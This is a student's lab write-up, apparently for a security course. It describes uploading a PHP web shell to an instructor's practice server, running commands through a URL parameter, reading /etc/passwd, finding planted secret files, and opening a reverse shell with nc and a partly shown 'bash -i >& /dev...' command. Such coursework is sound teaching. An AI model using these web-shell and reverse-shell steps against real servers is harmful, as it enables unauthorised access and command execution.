### Lazuli Kleinhans

# Part 1: Installing a PHP Web Shell

## Explain how you can execute the Linux command `whoami` on the server using your webshell. What result do you get when you execute that command?

After I uploaded my `kleinhansc-webshell.php` file, I am able to type `http://danger.jeffondich.com/uploadedimages/kleinhansc-webshell.php?command=whoami` into the address bar and remotely run the `whoami` command on Jeff's server. I get the result `www-data`.

## What is this webshell's `<pre>` tag for? (And more to the point, what happens if you leave it out?)

It defines preformatted text, which displays the content in a monospace font while preserving whitespace (like newlines and tabs). If you leave it out it prints all the text on the same line and makes interpreting the output very difficult.


# Part 2: Looking Around

## What directory is danger's website located in?

`/var/www/danger.jeffondich.com`

## What are the names of all the user accounts on `danger.jeffondich.com`? How do you know?

If I take a look at the contents of `/etc/passwd`, I see many different entries. Most entries have no shell (with the shell set as `/usr/sbin/nologin`), and therefore are not user accounts. The 4 that do have `/bin/bash` as their shell are `root`, `jeff`, `postgres`, and `bullwinkle`. `postgres` is not really a user account, so the three users are `root jeff bullwinkle`.

## Do you have access to the file `/etc/passwd`? What's in it?

Yes I do. There are listings of many different accounts that exist on the server. Each listing has details about each user, including the name, UID, home directory and the shell that that user uses. 

## Do you have access to the file `/etc/shadow`? What's in it? (You'll have to look online for the answer to that second question, since the answer to the first is no.)

No I do not. It stores the hashes of each user's password along with information about that password.

## There may be some secret files scattered around. See how many you can find and report on your discoveries.

* In the file `/home/jeff/youfoundme.txt` it says `This isn't the secret, but hi!`.
* In the file `/home/jeff/supersecret.txt` it says `Congratulations!` and then a wonderful piece of moose ASCII art.
* In the file `/opt/more-secrets.txt` it says `Oh look. You found me!`.
* In the file `/opt/.even-more-secrets.txt` it says `Aw, a little period couldn't hide me? So sad.`.
* In the file `/var/www/danger.jeffondich.com/secrets/kindasecret.txt` it says `Congratulations!` and then a wonderful piece of frog ASCII art.
* In the file `/var/www/danger.jeffondich.com/youwontfindthiswithgobuster/secret.txt` it says `Congratulations!` and then a wonderful piece of ASCII art depicting two birds.


## [Optional] Report on anything else interesting you discover.

I did find a readable RSA secret key file `/var/lib/fwupd/pki/secret.key`. Maybe want to lock that one down?


# Part 4: Launching a Reverse Shell

## What is the IP address of your Kali VM (the target machine)? How did you find out?

It is `192.168.161.129`. I found it by running `ip a` on Kali.

## What are the IP addresses of your host OS (the attacking machine)? How did you find out? Which one should you use to communicate with Kali and why?

My internal IP is `172.26.95.208` (which I found using `ip a`) and my external IP is `194.33.45.91` (which I found by looking at my VPN). I should use the internal `172.26.95.208` because I am communicating with a program that is running within the same system as Kali.

## Go back and look at your `nc -l -p` terminal on your host OS (attacking machine). Do you have a shell now? Is it letting you execute commands on Kali? How do you know it's Kali?

I do! It is! I know it is Kali because in the shell prompt `www-data@kali:/var/www/html$ ` it says `@kali` which indicates that the machine I am talking to is named `kali`.

## What are all those `%` codes in the URL you used?

They are representations of different characters that a web browser can decode to pass along to the Kali apache server. For example, `%20` is decoded as a space and `%22` is decoded as `"`.

## Write a brief description, probably including a diagram, explaining how this reverse shell is functioning.

Using the webshell that we put on the target machine, we are running a command on that machine that tells it to connect to the attacking machine. This command launches bash on the target machine, connecting its standard in and standard out to the connection we set up.

```
   [ATTACKING MACHINE]                [TARGET MACHINE]
       webshell.php          ----->
bash -c "bash -i >& /dev...  ----->     webshell.php
                             <-----        stdin
                             <-----        stdout
         whoami              ----->
                             <-----      "www-data"
```
